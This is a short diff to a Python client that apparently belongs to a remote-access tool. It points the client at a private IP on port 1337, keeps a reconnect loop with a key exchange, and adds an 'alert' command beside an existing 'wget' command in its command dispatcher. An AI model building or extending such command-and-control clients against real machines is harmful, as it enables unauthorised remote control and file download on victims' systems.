@@ -13,7 +13,7 @@ from core import *
 
 
 # change these to suit your needs
-HOST = 'localhost'
+HOST = '192.168.0.174'
 PORT = 1337
 
 # seconds to wait before client will attempt to reconnect
@@ -80,6 +80,9 @@ def client_loop(conn, dhkey):
 
         elif cmd == 'wget':
             results = toolkit.wget(action)
+
+        elif cmd == 'alert':
+            results = toolkit.alert(action)
 
         results = results.rstrip() + '\n{} completed.'.format(cmd)
 
